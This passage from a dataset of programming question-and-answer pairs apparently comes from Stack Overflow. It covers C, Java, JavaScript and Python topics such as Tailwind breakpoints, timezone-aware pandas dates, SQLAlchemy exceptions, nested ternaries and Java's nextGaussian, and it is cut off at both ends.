    cellspu  - STI CBEA Cell SPU [experimental]
    cpp      - C++ backend
    hexagon  - Hexagon
    mblaze   - MBlaze
    mips     - Mips
    mips64   - Mips64 [experimental]
    mips64el - Mips64el [experimental]
    mipsel   - Mipsel
    msp430   - MSP430 [experimental]
    nvptx    - NVIDIA PTX 32-bit
    nvptx64  - NVIDIA PTX 64-bit
    ppc32    - PowerPC 32
    ppc64    - PowerPC 64
    sparc    - Sparc
    sparcv9  - Sparc V9
    thumb    - Thumb
    x86      - 32-bit X86: Pentium-Pro and above
    x86-64   - 64-bit X86: EM64T and AMD64
    xcore    - XCore

In your case, you want llc -march=sparc, probably.
",c
how can i tell google translate to not translate a section of a website,"Google Translate has a developer tool that will enable google translate on a website. Is there a way to tell Google Translate to not translate a section of the website? Perhaps with a  class name on an HTML element?
I've tried the HTML5 translate=no attribute. It has no effect.
This is a particular problem because Google is mistranslating the name of the website.
","According to Google instructions, setting class=""notranslate"" prevents Google translation. This appears to work, though using it inline (e.g., for a single word) may imply some confusion, so you need to check out what happens.
For example,
Welcome to the <span class=""notranslate"">Cool</span> company website!

translates into Spanish as “Bienvenido a la Coolweb de la compañía!”, which isn’t that cool, though it demonstrates that “Cool” has been taken as a proper name; without the markup, the text would translate as “Bienvenido a la fresca web de la empresa!”.
Reformulating the text as
Welcome to the website of <span class=""notranslate"">Cool</span>!

would result in “Bienvenido a la página web de Cool!”, which looks better except that “site” has been mistranslated.
For different target languages, different problems may and will arise. In general, the simpler the grammatical structure of a sentence is, the more often it will get translated reasonably well.
The bottom line is: you can try to prevent translation using class=notranslate, but the problems of Google Translator may cause confusion.
",javascript
how do i get tailwind39s active breakpoint in javascript,"I am building Tailwind with config file and including it in a React project.
I would like to get the active breakpoint value in JavaScript/React. How can I achieve the same?


 <div class=""block  sm:hidden md:hidden lg:hidden xl:hidden"">al</div>
  <div class=""hidden sm:block  md:hidden lg:hidden xl:hidden"">sm</div>
  <div class=""hidden sm:hidden md:block  lg:hidden xl:hidden"">md</div>
  <div class=""hidden sm:hidden md:hidden lg:block  xl:hidden"">lg</div>
  <div class=""hidden sm:hidden md:hidden lg:hidden xl:block"">xl</div>
</div>



The above shows the active breakpoints. But how do I get the same in JS without including any of the above markup?
","Here's what I wrote in Typescript that returns the current breakpoint based on device width. You can place it in a standalone file and import the methods whenever needed in any file:
import resolveConfig from 'tailwindcss/resolveConfig';
import tailwindConfig from './tailwind.config'; // Fix the path

const fullConfig = resolveConfig(tailwindConfig);

export const getBreakpointValue = (value: string): number =>
  +fullConfig.theme.screens[value].slice(
    0,
    fullConfig.theme.screens[value].indexOf('px')
  );

export const getCurrentBreakpoint = (): string => {
  let currentBreakpoint: string;
  let biggestBreakpointValue = 0;
  for (const breakpoint of Object.keys(fullConfig.theme.screens)) {
    const breakpointValue = getBreakpointValue(breakpoint);
    if (
      breakpointValue > biggestBreakpointValue &&
      window.innerWidth >= breakpointValue
    ) {
      biggestBreakpointValue = breakpointValue;
      currentBreakpoint = breakpoint;
    }
  }
  return currentBreakpoint;
};


Edit:
in newer Typescript versions you have to add these two parameters to tsconfig.json under compilerOptions in order to be able import js files:
""compilerOptions"": {
  ""allowJs"": true,
  ""allowsyntheticdefaultimports"": true
}

Also, if you are on Angular and get the error that process is not defined, you have to add these lines to the end of your polyfills.ts file (you have to install the process package of course):
import * as process from 'process';
window['process'] = process;

",javascript
compute recursively the largest substring which starts and ends with sub and return its length,"The task is: Given a string and a non-empty substring sub, compute recursively the largest substring which starts and ends with sub and return its length.
Examples:
strDist(""catcowcat"", ""cat"") → 9
strDist(""catcowcat"", ""cow"") → 3
strDist(""cccatcowcatxx"", ""cat"") → 9

Can you please look at my code and tell me what is the problem with it?
public int strDist(String str, String sub) {
    if (str.length() < sub.length())
        return 0;

    if (str.length() == sub.length() && str.equals(sub))
        return str.length();

    if (str.length() < 2) {
        if (str.contains(sub)) {
            return 1;
        }
        return 0;
    }

    if (str.length() == 2) {
        if (sub.length() == 2 && str.equals(sub))
            return 2;

        if (str.contains(sub))
            return 1;

        return 0;
    }

    if (str.length() > 2) {
        if (str.startsWith(sub) && str.endsWith(sub)) {
            return str.length();
        }

        if (str.substring(0, sub.length()).equals(sub)) {
            strDist(str.substring(0, str.length() - 2), sub);
        }

        if (str.substring(str.length() - sub.length(), str.length() - 1).equals(sub))
            strDist(str.substring(1, str.length() - 1), sub);
    }
    return strDist(str.substring(1, str.length() - 1), sub);
}

it doesn't work for the case  strDist(""hiHellohihihi"", ""hih"") → 5
and returns zero.
","First, to answer your question, I found a number of issues in your code. My corrected version follows, with comments about the changes I did.
public int strDist(String str, String sub) {

    if (str.length() < sub.length())
        return 0;
    // simplified condition
    if (str.equals(sub))
        return str.length();

    if (str.length() < 2) {
        if (str.contains(sub)) {
            // corrected (if str and sub are both empty strings, you don’t want to return 1)
            return str.length();
        }
        return 0;
    }

    // deleted str.length() == 2 case that didn’t work correctly

    if (str.startsWith(sub) && str.endsWith(sub)) {
        return str.length();
    }
    if (str.startsWith(sub)) { // simplified
        // subtracting only 1 and added return statement
        return strDist(str.substring(0, str.length() - 1), sub);
    }
    // changed completely -- didn’t understand; added return statement, I believe this solved your test case
    if (str.endsWith(sub))
        return strDist(str.substring(1), sub);
    return strDist(str.substring(1, str.length() - 1), sub);

}

Now if I do:
    System.out.println(strDist(""catcowcat"", ""cat""));
    System.out.println(strDist(""catcowcat"", ""cow""));
    System.out.println(strDist(""cccatcowcatxx"", ""cat""));
    System.out.println(strDist(""hiHellohihihi"", ""hih""));

I get:
9
3
9
5

Second, as I said in a comment, I see no point in using recursion here (except perhaps for the exercise). The following version of your method doesn’t, it’s much simpler and it works the same:
public int strDist(String str, String sub) {
    int firstOccurrence = str.indexOf(sub);
    if (firstOccurrence == -1) { // sub not in str
        return 0;
    }
    int lastOccurrence = str.lastIndexOf(sub);
    return lastOccurrence - firstOccurrence + sub.length();
}

Finally, and this may or may not be helpful, a recursive version needs not be as complicated as yours:
public int strDist(String str, String sub) {
    if (sub.isEmpty()) {
        throw new IllegalArgumentException(""sub mustn’t be empty"");
    }
    if (str.length() <= sub.length()) {
        if (str.equals(sub)) {
            return str.length();
        } else { // sub cannot be in str
            return 0;
        }
    }
    if (str.startsWith(sub)) {
        if (str.endsWith(sub)) {
            return str.length();
        } else {
            return strDist(str.substring(0, str.length() - 1), sub);
        }
    } else {
        return strDist(str.substring(1), sub);
    }
}

It’s fine to get something to work first if you can, even if it’s not the most simple and elegant solution. When either it works or it doesn’t, is a good time to think of ways to simplify. It will make it easier to nail down the bug(s) and also ease maintenance later. Special cases, like length 1 and length 2, are often a good candidate for simplification: see if the general code already caters for them or can easily be made to.
",java
cannot compare tznaive and tzaware timestamps,"I'm finding the error below:
Cannot compare tz-naive and tz-aware timestamps
How can I convert dates to fix the issue? The error appear in the end of the syntax below.
from datetime import datetime, timedelta
import pytz
# Define start and end dates
start = datetime(2024, 6, 1)
end = datetime(2024, 12, 10)
current_date = start
# List to store valid dates
valid_dates = []

while current_date <= end:
    valid_dates.append(current_date.strftime('%Y-%m-%d'))
    current_date += timedelta(days=1)

df['OpenDate'] = pd.to_datetime(df['OpenDate'], utc=True)
df['CloseDate'] = pd.to_datetime(df['CloseDate'], errors='coerce', utc=True)

date_range = pd.date_range(start=start, end=end)

results = []

for index, row in df.iterrows():
    for current_date in date_range:
        if row['OpenDate'] < current_date and (pd.isnull(row['CloseDate']) or 
row['CloseDate'] > current_date) and row['CloseType'] in [0, 1, 3, 7, 8]:
            result_row = {
                'CurrentDate': current_date,
                'User_Id': row['User_Id'],
                'OpenDate': row['OpenDate'],
                'CloseDate': row['CloseDate'],
                'CloseType': row['CloseType']
            }
            results.append(result_row)

","try this to convert to tz-aware:
start = datetime(2024, 6, 1, tzinfo=pytz.UTC)
end = datetime(2024, 12, 10, tzinfo=pytz.UTC)

And to create a tz-aware time range:
date_range = pd.date_range(start=start, end=end, tz='UTC')

Complete code:
from datetime import datetime, timedelta
import pytz
import pandas as pd

# Define start and end dates (timezone-aware)
start = datetime(2024, 6, 1, tzinfo=pytz.UTC)
end = datetime(2024, 12, 10, tzinfo=pytz.UTC)
current_date = start

# List to store valid dates
valid_dates = []
while current_date <= end:
    valid_dates.append(current_date.strftime('%Y-%m-%d'))
    current_date += timedelta(days=1)

# Convert 'OpenDate' and 'CloseDate' to timezone-aware datetimes
df['OpenDate'] = pd.to_datetime(df['OpenDate'], utc=True)
df['CloseDate'] = pd.to_datetime(df['CloseDate'], errors='coerce', utc=True)

# Create a timezone-aware date range
date_range = pd.date_range(start=start, end=end, tz='UTC')

results = []
for index, row in df.iterrows():
    for current_date in date_range:
        if row['OpenDate'] < current_date and (pd.isnull(row['CloseDate']) or 
row['CloseDate'] > current_date) and row['CloseType'] in [0, 1, 3, 7, 8]:
            result_row = {
                'CurrentDate': current_date,
                'User_Id': row['User_Id'],
                'OpenDate': row['OpenDate'],
                'CloseDate': row['CloseDate'],
                'CloseType': row['CloseType']
            }
            results.append(result_row)

Hope this helps.
",python
threadpoolexecutor  get a specific runnable that is being executed,"I am using ThreadPoolExecutor to execute multiple long running tasks in background, pool size of ThreadPoolExecutor is 4 so when more than 4 task are being added they are pushed on to queue and when one of 4 tasks gets complete one task is poped from queue for execution.
I want to know is there any way to access object of Runnable that are currently being executed and not in queue, i.e first 4 tasks.
Aim: I want to do this to get current status of task at any given point, with the help of mThreadPoolExecutor.getQueue() I am accessing tasks being queued and ready to execute, please suggest me way to access tasks those are currently being executed so that I can attach and remove listener/handler on it when ever required.
My Runnable class:
public class VideoFileUploadRunner implements Runnable {

    private final VideoFileSync mVideoFileSync;
    private final DataService dataService;

    private Handler handler;

    public VideoFileUploadRunner(VideoFileSync videoFileSync, DataService dataService) {
        this.mVideoFileSync = videoFileSync;
        this.dataService = dataService;

    }

    public int getPK()
    {
        return  mVideoFileSync.get_idPrimaryKey();
    }

    public void setHandler(Handler handler) {
        this.handler = handler;
    }

    @Override
    public void run() {
        try {

            if (mVideoFileSync.get_idPrimaryKey() < 0) {
                addEntryToDataBase();
            }
            updateStatus(VideoUploadStatus.IN_PROGRESS);
            FileUploader uploader = new FileUploader();
            updateStatus(uploader.uploadFile(mVideoFileSync.getVideoFile()));



        } catch (Exception e) {
            updateStatus(VideoUploadStatus.FAILED);
            e.printStackTrace();
        }
    }

    private void addEntryToDataBase() {
        int pk = dataService.saveVideoRecordForSync(mVideoFileSync);
        mVideoFileSync.set_idPrimaryKey(pk);
    }

    private void updateStatus(VideoUploadStatus status) {
        if (handler != null) {
            Message msg = new Message();
            Bundle b = new Bundle();
            b.putString(AppConstants.Sync_Status, status.toString());
            msg.setData(b);
            handler.sendMessage(msg);
        }
        dataService.updateUploadStatus(mVideoFileSync.get_idPrimaryKey(), status.toString());


    }
} 

In Task progress list view holder:
public void setData(VideoFileSync fileSync) {
        tvIso.setText(fileSync.getVideoFile().getISO_LOOP_EQUP());
        tvUnit.setText(fileSync.getVideoFile().getUnit());
        tvName.setText(fileSync.getVideoFile().getLocalPath());
        tvStatus.setText(fileSync.getCurentStatus().toString());
        addHandleForUpdate(fileSync);
    }

    private void addHandleForUpdate(VideoFileSync fileSync) {

        Handler.Callback callBack = new Handler.Callback() {
            @Override
            public boolean handleMessage(Message msg) {
                if(msg.getData()!=null)
                {
                    tvStatus.setText(msg.getData().getString(AppConstants.Sync_Status));

                }
                return false;
            }
        };
        mHadler = new Handler(Looper.getMainLooper(),callBack);

        VideoFileUploadRunner runner = VideoUploadManager.getInstance().getRunnerForSyncFile(fileSync);
        if(runner!=null)
        runner.setHandler(mHadler);
    }

in VideoUploadManager I have following method to return Runnable object, Here I want help so that I can return tasks being currently executed.
public synchronized VideoFileUploadRunner getRunnerForSyncFile(VideoFileSync fileSync) {
        Iterator<Runnable> itr = mThreadPoolExecutor.getQueue().iterator();
        while (itr.hasNext()) {
            VideoFileUploadRunner runner = (VideoFileUploadRunner) itr.next();
            if (runner.getPK() == fileSync.get_idPrimaryKey()) {
                return runner;
            }
        }
        return null;

    } 

","The best way is to expose a synchronized variable holding the informations on currently executing tasks.
public MyTask implements Runnable {
    private String id;
    private Map<String, MyTask> mapTasks;

    public MyTask(String id, Map<String, MyTask> mapTasks) {
        this.id = id;
        this.mapTasks = mapTasks;
    }

    public void run() {
         synchronized(mapTasks) {
             mapTasks.put(id, this);
         }
         try {
             ...
         } finally {
             synchronized(mapTasks) {
                 mapTasks.remove(id);
             }
         }
    }
}


// Create a map of tasks
Map<String, MyTask> mapTasks = new HashMap<String, MyTask>();

// How to create tasks
MyTask myTask1 = new MyTask(""task1"", mapTasks);
MyTask myTask2 = new MyTask(""task2"", mapTasks);

executorService.execute(myTask1);
executorService.execute(myTask2);

....

And to print the list of tasks currently in execution:
public void printCurrentExecutingTasks(Map<String, MyTask> tasks) {
    for (String id: tasks.keySet()) {
        System.out.println(""Executing task with id: "" + id);
    }
}

",java
how to check and handle errors in sqlalchemy,"How do you handle errors in SQLAlchemy? I am relatively new to SQLAlchemy and do not know yet.
Before I used SQLAlchemy, I would do things like
status = db.query(""INSERT INTO users ..."")
if (!status):
    raise Error, db.error

But now I am coding in SQLAlchemy and I do things like
user = User('Boda Cydo')
session.add(user)
session.commit()

No error checking whatsoever!
I do not like this coding style without error checking at all.
Please advice on how to check and handle errors in SQLAlchemy!
","Your example says:
status = db.query(""INSERT INTO users ..."")
if (!status):
    raise Error, db.error

That seems to mean that you want to raise an exception if there's some error on the query (with raise Error, db.error). However sqlalchemy already does that for you - so 
user = User('Boda Cydo')
session.add(user)
session.commit()

Is just the same. The check-and-raise part is already inside SQLAlchemy.
Here is a list of the errors sqlalchemy itself can raise, taken from help(sqlalchemy.exc) and help(sqlalchemy.orm.exc):

sqlalchemy.exc:


ArgumentError - Raised when an invalid or conflicting function argument is supplied.
This error generally corresponds to construction time state errors.
CircularDependencyError - Raised by topological sorts when a circular dependency is detected
CompileError - Raised when an error occurs during SQL compilation
ConcurrentModificationError
DBAPIError - Raised when the execution of a database operation fails.
If the error-raising operation occured in the execution of a SQL
statement, that statement and its parameters will be available on
the exception object in the statement and params attributes.
The wrapped exception object is available in the orig attribute.
Its type and properties are DB-API implementation specific.
DataError Wraps a DB-API DataError.
DatabaseError - Wraps a DB-API DatabaseError.
DisconnectionError - A disconnect is detected on a raw DB-API connection. 
be raised by a PoolListener so that the host pool forces a disconnect.
FlushError
IdentifierError - Raised when a schema name is beyond the max character limit
IntegrityError - Wraps a DB-API IntegrityError.
InterfaceError - Wraps a DB-API InterfaceError.
InternalError - Wraps a DB-API InternalError.
InvalidRequestError - SQLAlchemy was asked to do something it can't do. This error generally corresponds to runtime state errors.  
NoReferenceError - Raised by ForeignKey to indicate a reference cannot be resolved.
NoReferencedColumnError - Raised by ForeignKey when the referred Column cannot be located.
NoReferencedTableError - Raised by ForeignKey when the referred Table cannot be located.
NoSuchColumnError - A nonexistent column is requested from a RowProxy.
NoSuchTableError - Table does not exist or is not visible to a connection.
NotSupportedError - Wraps a DB-API NotSupportedError.
OperationalError - Wraps a DB-API OperationalError.
ProgrammingError - Wraps a DB-API ProgrammingError.
SADeprecationWarning - Issued once per usage of a deprecated API.
SAPendingDeprecationWarning - Issued once per usage of a deprecated API.
SAWarning - Issued at runtime.
SQLAlchemyError - Generic error class.
SQLError - Raised when the execution of a database operation fails.
TimeoutError - Raised when a connection pool times out on getting a connection.
UnboundExecutionError - SQL was attempted without a database connection to execute it on.
UnmappedColumnError

sqlalchemy.orm.exc:


ConcurrentModificationError - Rows have been modified outside of the unit of work.
FlushError - A invalid condition was detected during flush().
MultipleResultsFound - A single database result was required but more than one were found.
NoResultFound - A database result was required but none was found.
ObjectDeletedError - A refresh() operation failed to re-retrieve an object's row.
UnmappedClassError - A mapping operation was requested for an unknown class.
UnmappedColumnError - Mapping operation was requested on an unknown column.
UnmappedError - TODO
UnmappedInstanceError - A mapping operation was requested for an unknown instance.


",python
cases for gcc to ignore register declaration,"K&R says  

compilers are free to ignore the advice (register declaration).

In what cases, gcc would ignore if I define register int x = 4;?
","This is totally implementation-dependent.
In general, you should trust the compiler to put variables to register and not define them yourself.

C99 6.7.1 Storage-class specifiers
A declaration of an identifier for an object with storage-class specifier register
  suggests that access to the object be as fast as possible. The extent to which such
  suggestions are effective is implementation-defined.

Plus, C++11 has deprecated the use of the register keyword as a storage-class-specifier, maybe sometime in the future C will do the same.
",c
how to rewrite complicated lines of c code nested ternary operator,"I've been looking through someone else's code for debugging purposes and found this:
!m_seedsfilter ? good=true : m_seedsfilter==1 ? good=newClusters(Sp) : good=newSeed(Sp);  

What does this mean? Is there an automated tool that will render this into more comprehensible if/else statements? Any tips for dealing with complicated control structures like this?
Edit note: I changed this from ""unnecessarily complicated"" to ""complicated"" in the title, since it's a matter of opinion. Thanks for all your answers so far.
","The statement as written could be improved if rewritten as follows....
good = m_seedsfilter==0 ? true :
       m_seedsfilter==1 ? newClusters(Sp) :
                          newSeed(Sp);

...but in general you should just become familar with the ternary statement.  There is nothing inherently evil about either the code as originally posted, or xanatos' version, or mine.  Ternary statements are not evil, they're a basic feature of the language, and once you become familiar with them, you'll note that code like this (as I've posted, not as written in your original post) is actually easier to read than a chain of if-else statements.  For example, in this code, you can simply read this statement as follows: ""Variable good equals... if m_seedsfilter==0, then true, otherwise, if m_seedsfilter==1, then newClusters(Sp), otherwise, newSeed(Sp).""
Note that my version above avoids three separate assignments to the variable good, and makes it clear that the goal of the statement is to assign a value to good.  Also, written this way, it makes it clear that essentially this is a ""switch-case"" construct, with the default case being newSeed(Sp).
It should probably be noted that my rewrite above is good as long as operator!() for the type of m_seedsfilter is not overridden.  If it is, then you'd have to use this to preserve the behavior of your original version...
good = !m_seedsfilter   ? true :
       m_seedsfilter==1 ? newClusters(Sp) :
                          newSeed(Sp);

...and as xanatos' comment below proves, if your newClusters() and newSeed() methods return different types than each other, and if those types are written with carefully-crafted meaningless conversion operators, then you'll have to revert to the original code itself (though hopefully formatted better, as in xanatos' own post) in order to faithfully duplicate the exact same behavior as your original post.  But in the real world, nobody's going to do that, so my first version above should be fine.

UPDATE, two and a half years after the original post/answer:
It's interesting that @TimothyShields and I keep getting upvotes on this from time to time, and Tim's answer seems to consistently track at about 50% of this answer's upvotes, more or less (43 vs 22 as of this update).
I thought I'd add another example of the clarity that the ternary statement can add when used judiciously. The examples below are short snippets from code I was writing for a callstack usage analyzer (a tool that analyzes compiled C code, but the tool itself is written in C#). All three variants accomplish exactly the same objective, at least as far as externally-visible effects go.
1. WITHOUT the ternary operator:
Console.Write(new string(' ', backtraceIndentLevel) + fcnName);
if (fcnInfo.callDepth == 0)
{
   Console.Write("" (leaf function"");
}
else if (fcnInfo.callDepth == 1)
{
   Console.Write("" (calls 1 level deeper"");
}
else
{
   Console.Write("" (calls "" + fcnInfo.callDepth + "" levels deeper"");
}
Console.WriteLine("", max "" + (newStackDepth + fcnInfo.callStackUsage) + "" bytes)"");

2. WITH the ternary operator, separate calls to Console.Write():
Console.Write(new string(' ', backtraceIndentLevel) + fcnName);
Console.Write((fcnInfo.callDepth == 0) ? ("" (leaf function"") :
              (fcnInfo.callDepth == 1) ? ("" (calls 1 level deeper"") :
                                         ("" (calls "" + fcnInfo.callDepth + "" levels deeper""));
Console.WriteLine("", max "" + (newStackDepth + fcnInfo.callStackUsage) + "" bytes)"");

3. WITH the ternary operator, collapsed to a single call to Console.Write():
Console.WriteLine(
   new string(' ', backtraceIndentLevel) + fcnName +
   ((fcnInfo.callDepth == 0) ? ("" (leaf function"") :
    (fcnInfo.callDepth == 1) ? ("" (calls 1 level deeper"") :
                               ("" (calls "" + fcnInfo.callDepth + "" levels deeper"")) +
   "", max "" + (newStackDepth + fcnInfo.callStackUsage) + "" bytes)"");

One might argue that the difference between the three examples above is trivial, and since it's trivial, why not prefer the simpler (first) variant? It's all about being concise; expressing an idea in ""as few words as possible"" so that the listener/reader can still remember the beginning of the idea by the time I get to the end of the idea.  When I speak to small children, I use simple, short sentences, and as a result it takes more sentences to express an idea. When I speak with adults fluent in my language, I use longer, more complex sentences that express ideas more concisely.
These examples print a single line of text to the standard output. While the operation they perform is simple, it should be easy to imagine them as a subset of a larger sequence. The more concisely I can clearly express subsets of that sequence, the more of that sequence can fit on my editor's screen. Of course I can easily take that effort too far, making it more difficult to comprehend; the goal is to find the ""sweet spot"" between being comprehensible and concise. I argue that once a programmer becomes familiar with the ternary statement, comprehending code that uses them becomes easier than comprehending code that does not (e.g. 2 and 3 above, vs. 1 above).
The final reason experienced programmers should feel comfortable using ternary statements is to avoid creating unnecessary temporary variables when making method calls. As an example of that, I present a fourth variant of the above examples, with the logic condensed to a single call to Console.WriteLine(); the result is both less comprehensible and less concise:
4. WITHOUT the ternary operator, collapsed to a single call to Console.Write():
string tempStr;
if (fcnInfo.callDepth == 0)
{
   tempStr = "" (leaf function"";
}
else if (fcnInfo.callDepth == 1)
{
   tempStr = "" (calls 1 level deeper"";
}
else
{
   tempStr = "" (calls "" + fcnInfo.callDepth + "" levels deeper"";
}
Console.WriteLine(new string(' ', backtraceIndentLevel) + fcnName + tempStr +
                  "", max "" + (newStackDepth + fcnInfo.callStackUsage) + "" bytes)"");

Before arguing that ""condensing the logic to a single call to Console.WriteLine() is unnecessary,"" consider that this is merely an example: Imagine calls to some other method, one which takes multiple parameters, all of which require temporaries based on the state of other variables. You could create your own temporaries and make the method call with those temporaries, or you could use the ternary operator and let the compiler create its own (unnamed) temporaries. Again I argue that the ternary operator enables far more concise and comprehensible code than without. But for it to be comprehensible you'll have to drop any preconceived notions you have that the ternary operator is evil.
",c
how to detect which userscript manager is running the script,"I'm using a function in a userscript that I'm writing which does not work in Greasemonkey due to the limitations of Greasemonkey. This function is not necessary for proper operation of the userscript, but it improves user experience, so I don't want to just remove it entirely. 
I tried using a try { ... } catch() { ... } block, but unfortunately Greasemonkey ceases execution of the script as soon as it attempts execution of the function instead of throwing an exception. So I instead decided to prevent execution of the function when the script is loaded via Greasemonkey, but I have been unable to find a method of doing that.

I've read through the API reference, but was unable to find anything useful. 
I found this github issue that would allow detection of Greasemonkey but that seems to have been ""fixed"" now.
I looked through this topic on userscripts-mirror.org, but the proposed solution in that thread checks for the existence of GM* functions, which are also available in most other userscript managers (specifically Tampermonkey and Violentmonkey which support the function that Greasemonkey does not).

How can I go about detecting whether the active userscript manager is Greasemonkey or not?
","Checking what manager is running is a poor approach, which will prove to be brittle and high maintenance.  The smart thing to do is to check if this mysterious function exists, or works as needed.
This is the same type of problem as ""browser sniffing"" and the answer is the same:  Use feature detection instead.
EG:
if (typeof dicyFunc == ""function"") {
    //-- Use the function
    dicyFunc ();
}
else {
    console.error (""This userscript engine does not support dicyFunc."");
}

Update for user comment:
Sometimes you might also need a try... catch block. EG:
try {
    REALLY_dicyFunc ();
}
catch (zError) {
    console.error (""REALLY_dicyFunc fail on this engine: "", zError);
}

You need to give a concrete example (Make an MCVE) for more.

If you insist on engine detection, then see this answer to a near duplicate question.
Essentially, you would use GM_info.scriptHandler property, possibly backed up by the GM_info.version property.
For best results, make a feature request for Greasemonkey to support the scriptHandler property. (Tampermonkey and ViolentMonkey already do.)
There is a recently closed pull request for this for Greasemonkey, so maybe it will be in the next version?
",javascript
obtain thistextcontent during custom element construction,"This is a conceptual question for those who understand custom elements without seeing concrete code examples.
I'm creating a custom element that's display depends on its textContent. In the custom element's constructor, if I try to access this.textContent it returns an empty string, even though the html of that custom element does indeed contain text.
In order to obtain the textContent during the custom element's construction, I enclosed my constructor code within a setTimeout and then was able to make my custom elements construction be base on its textContent.
However, this felt a little hacky and I figured there was a more proper way to obtain textContent during an element's construction. That's when I found Using the life Cycle Callbacks.
The connectedCallback method allowed me to see textContent without putting a setTimeout into the custom element's constructor. However, this quote concerns me:

connectedCallback: . . . may happen before the element's contents have
been fully parsed.

This worries me that if I have a lot of content inside the custom element, this.textContent may still return an empty string because all that text may not yet be ""fully parsed"".
Is this worry justified? Is there a more sure way to obtain this.textContent as a basis for your custom element's construction? Or, should I go with my initial solution of putting a setTimeout within the custom element's constructor?
","See 4 year later blogpost:
https://dev.to/dannyengelman/web-component-developers-do-not-connect-with-the-connectedcallback-yet-4jo7


Old answer
In your example textContent is DOM content
The constructor should not (try to) access DOM,
as it can be run from  .createElement('your-element')  when there is no DOM at all.
(or in a Server-Side-Rendering scenario)
connectedCallback runs before the whole DOM inside finished parsing. If you want to access its DOM content you have to wait till Element DOM is ready.
Only in FireFox you can access Element DOM content;
see: wait for Element Upgrade in connectedCallback: FireFox and Chromium differences
For detailed analysis see: https://jsfiddle.net/CustomElementsExamples/n20bwckt/
Note the difference when run in FireFox and Chrome.
setTimeout( func , 0 )
is totally valid (but better not in the constructor) and ensures your code runs when the EventLoop is empty, thus when all DOM is ready to be accessed. You could also use requestAnimationFrame.
All libraries do something similar under the hood to add updateComplete and the likes.
With bare-bones Custom Element API you have to write it yourself.
Note: The connectedCallback now triggers code that runs after a (potential) disconnectedCallback, so check for that with this.isConnected in your code.
For visual diagram when all callbacks run see:
https://andyogo.github.io/custom-element-reactions-diagram/
Note: if you don't specify any methods in your own Element, the methods from HTMLElement run.
So Elements without any declared constructor or connectedCallback are perfectly valid.
In IconMeister I only use attributeChangedCallback
",javascript
java normal distribution,"I'm trying to simulate the arrival of fans to a stadium. The system itself, I believe it won't be a problem, but, the arrival of the fans follows a normal distribution. 
My problem is:
I have a certain time for the arrival like 100 minutes and 1000 fans, and I need to generate arrivals of Fans at a time following that distribution like -> fan x arrived at 25 minutes, fan y arrived at 54 minutes, and so on.
How can I generate these random numbers following a normal distribution?
I'm doing this in Java and found the nextGaussian() method in the Random class, but I'm not sure how to use this in my situation.
Can someone please enlighten me?
","nextGaussian() will draw samples from a normal distribution with mean 0 and std-deviation 1, so if you want mean 1 hour and std-deviation 15 minutes you'll need to call it as nextGaussian()*15+60.
From the docs for Random.nextGaussian():

Returns:
the next pseudorandom, Gaussian (""normally"") distributed double value with mean 0.0 and standard deviation 1.0 from this random number generator's sequence

UPDATE for Java 17
nextGaussian(mean, stdev) is available since Java 17.
",java
easy way to read utf8 characters from a binary file,"Here is my problem: I have to read ""binary"" files, that is, files which have varying ""record"" sizes, and which may contain binary data, as well as UTF-8-encoded text fields.
Reading a given number of bytes from an input file is trivial, but I was wondering if there were functions to easily read a given number of characters (not bytes) from a file ? Like, if I know I need to read a 10-characters field (encoded in UTF-8, it would be at least 10 bytes long, but could go up to 40 or more, if we're talking ""high"" codepoints).
I emphasize that I'm reading a ""mixed"" file, that is, I cannot process it whole as UTF-8, because the binary fields have to be read without being interpreted as UTF-8 characters.
So, while doing it by hand is pretty straightforward (the byte-by-byte, naïve approach, isn't hard to implement - even though I'm dubious about the efficiency), I'm wondering if there are better alternatives out there. If possible, in the standard library, but I'm open to 3rd party code too - if my organization validates its use.
","Here are two possibilities:
(1) If (but typically only if) your locale is set to handle UTF-8, the getwc function should read exactly one UTF-encoded Unicode character, even if it's multiple bytes long.  So you could do something like
setlocale(LC_CTYPE, ""UTF-8"");
wint_t c;

for(i = 0; i < 10; i++) {
    c = getwc(ifp);
    /* do something with c */
}

Now, c here will be a single integer containing a Unicode codepoint, not a UTF-8 multibyte sequence.  If (as is likely) you want to store UTF-8 strings in your in-memory data structure(s), you'd have to convert back to UTF-8, likely using wctomb.
(2) You could read N bytes from the input, then convert them to a wide character stream using mbstowcs.  This isn't perfect, either, because it's hard to know what N should be, and the wide character string that mbstowcs gives you is, again, probably not what you want.
But before exploring either of these approaches, the question really is, what is the format of your input?  Those UTF-encoded fragments of text, are they fixed-size, or does the file format contain an explicit count saying how big they are?  And in either case, is their size specified in bytes, or in characters?  Hopefully it's specified in bytes, in which case you don't need to do any conversion to/from UTF-8, you can just read N characters using fread.  If the count is specified in terms of characters (which would be kind of weird, in my experience), you would probably have to use something like my approach (1) above.
Other than a loop like in (1) above, I don't know of a simple, encapsulated way to do the equivalent of ""read N UTF-8 characters, no matter how many bytes it takes"".
",c
not sure why i am getting an error for my instance,"I have created two classes,  PassCar and Motor. My project requires that I create a Motor instance for each PassCar, but I am struggling to do so. When I try to create an instance of Motor in PassCar, it does not work.
I've attempted
Motor motor = new Motor();
and 
private Motor motor = new Motor(); 
Below is my code for PassCar
The error states that the constructor Motor is undefined.
public class PassCar extends Vehicle{

    private Motor motor = new Motor();// the error 
    private int numPass;
    private boolean AC;

    public PassCar(String make, String model, int year, double price, int numPass, boolean aC, Motor motor) {
        super(make, model, year, price);
        this.numPass = numPass;
        AC = aC;
        this.motor = motor;

    }


    public int getNumPass() {
        return numPass;
    }

    public void setNumPass(int numPass) {
        this.numPass = numPass;
    }

    public boolean isAC() {
        return AC;
    }

    public void setAC(boolean aC) {
        AC = aC;
    }

    public Motor getMotor() {
        return motor;
    }

    public void setMotor(Motor motor) {
        this.motor = motor;
    }


    public void description() {
        System.out.print(""In this application, a passenger car is an every day vehicle registered to an individual"");
    }

    @Override
    public String toString() {
        String s  = super.toString();
        s += ""PassCar numPass = "" + numPass + "", AC = "" + AC + "", motor = "" + motor;
        return s;
    }



}

code for Motor class 
public class Motor {

    private String name;
    private int cylinders;
    private int bhp;
    private double displacement;

    public Motor(String name, int cylinders, int bhp, double displacement) {
        super();
        this.name = name;
        this.cylinders = cylinders;
        this.bhp = bhp;
        this.displacement = displacement;
    }





    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getCylinders() {
        return cylinders;
    }

    public void setCylinders(int cylinders) {
        this.cylinders = cylinders;
    }

    public int getBhp() {
        return bhp;
    }

    public void setBhp(int bhp) {
        this.bhp = bhp;
    }

    public double getDisplacement() {
        return displacement;
    }

    public void setDisplacement(double displacement) {
        this.displacement = displacement;
    }

    @Override
    public String toString() {
